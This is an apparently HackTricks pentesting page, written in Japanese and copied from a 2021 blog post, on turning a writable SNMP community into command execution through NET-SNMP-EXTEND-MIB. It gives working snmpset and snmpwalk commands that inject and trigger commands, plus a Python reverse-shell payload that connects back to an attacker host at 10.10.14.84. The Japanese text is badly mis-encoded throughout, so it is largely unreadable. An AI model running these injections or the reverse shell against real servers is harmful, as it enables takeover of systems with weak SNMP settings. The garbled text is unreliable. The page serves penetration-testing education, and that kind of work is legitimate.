<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricks repo](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>


ã“ã®æŠ•ç¨¿ã¯[https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)ã‹ã‚‰ã‚³ãƒ”ãƒ¼ã•ã‚Œã¾ã—ãŸã€‚

SNMPã¯ã€ãƒ‡ãƒã‚¤ã‚¹ã‚„ã‚µãƒ¼ãƒãƒ¼ã®ç®¡ç†è€…ã«ã‚ˆã£ã¦ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®è¨­å®šã§è¦‹è½ã¨ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚Linuxã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ä¸Šã®SNMPã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«ã¯ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã§ãã‚‹æ›¸ãè¾¼ã¿æ¨©é™ï¼ˆ**rwcommunity**ï¼‰ãŒã‚ã‚Šã¾ã™ã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-6.png?w=508)

# **ã‚µãƒ¼ãƒ“ã‚¹ã®æ‹¡å¼µ**

**snmpd.conf**ã§æ§‹æˆã•ã‚ŒãŸæ—¢å­˜ã®ã‚¨ãƒ³ãƒˆãƒªã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒã€MIBå®šç¾©ã®ã€ŒMAX-ACCESSã€ãƒ‘ãƒ¼ãƒŸãƒƒã‚·ãƒ§ãƒ³è¨­å®šãŒã€Œ**read-create**ã€ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€SNMPã‚’ä»‹ã—ã¦è¿½åŠ ã®ã‚³ãƒãƒ³ãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

æ–°ã—ã„ã‚³ãƒãƒ³ãƒ‰ã®è¿½åŠ ã¯ã€åŸºæœ¬çš„ã«ã¯ã€Œ**nsExtendObjects**ã€ãƒ†ãƒ¼ãƒ–ãƒ«ã«è¿½åŠ ã®è¡Œã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã¾ã™ã€‚
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
SNMPã‚µãƒ¼ãƒ“ã‚¹ã§å®Ÿè¡Œã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ã‚’æ³¨å…¥ã—ã¾ã™ã€‚**NET-SNMP-EXTEND-MIB**ã§ã¯ã€å¸¸ã«å®Ÿè¡Œå¯èƒ½ãªçµ¶å¯¾ãƒ‘ã‚¹ã‚’æä¾›ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å‘¼ã³å‡ºã•ã‚Œã‚‹ãƒã‚¤ãƒŠãƒª/ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚‚å­˜åœ¨ã—ã€å®Ÿè¡Œå¯èƒ½ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-15.png?w=916)

snmpwalkã‚’ä½¿ç”¨ã—ã¦ã€æ³¨å…¥ã—ãŸã‚³ãƒãƒ³ãƒ‰ã‚’åˆ—æŒ™ã—ã¦å®Ÿè¡Œã—ã¾ã™ã€‚
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
ã‚³ãƒãƒ³ãƒ‰ã¯/bin/echoã§ã™ã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-11.png?w=569)

ã‚³ãƒãƒ³ãƒ‰ã¯èª­ã¿å–ã‚‰ã‚Œã‚‹ã¨å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚**run-on-read\(\)**

![](https://rioasmara.files.wordpress.com/2021/02/image-12.png?w=612)

ã‚³ãƒãƒ³ãƒ‰**/bin/echo "hello rio is here"**ã¯ã€snmpwalkã®èª­ã¿å–ã‚Šä¸­ã«å®Ÿè¡Œã•ã‚Œã¾ã—ãŸã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-13.png?w=653)

# **Net-SNMP Extendã‹ã‚‰ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹**

ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã‚’åˆ¶å¾¡ã™ã‚‹ãŸã‚ã®ã‚µãƒ¼ãƒãƒ¼ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚

**mxrch**ã«ã‚ˆã£ã¦é–‹ç™ºã•ã‚ŒãŸPythonã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚[**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git)ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚

ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®å‰ææ¡ä»¶ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ãã¾ã™ã€‚
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
![](https://rioasmara.files.wordpress.com/2021/02/image-18.png?w=723)

**é€†ã‚·ã‚§ãƒ«ã®ä½œæˆ**

SNMPã«ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§ã€æ‰‹å‹•ã§é€†ã‚·ã‚§ãƒ«ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
![](https://rioasmara.files.wordpress.com/2021/02/image-19.png?w=930)

snmpwalkã‚’å®Ÿè¡Œã—ã¦ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-21.png?w=687)

ç§ãŸã¡ã®netcatã¯ã€è¢«å®³è€…ã‹ã‚‰ã®é€†ã‚·ã‚§ãƒ«æ¥ç¶šã‚’å—ã‘å–ã‚Šã€è¢«å®³è€…ã®ãƒã‚·ãƒ³ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-20.png?w=502)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- **[ğŸ’¬](https://emojipedia.org/speech-balloon/) Discordã‚°ãƒ«ãƒ¼ãƒ—**ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
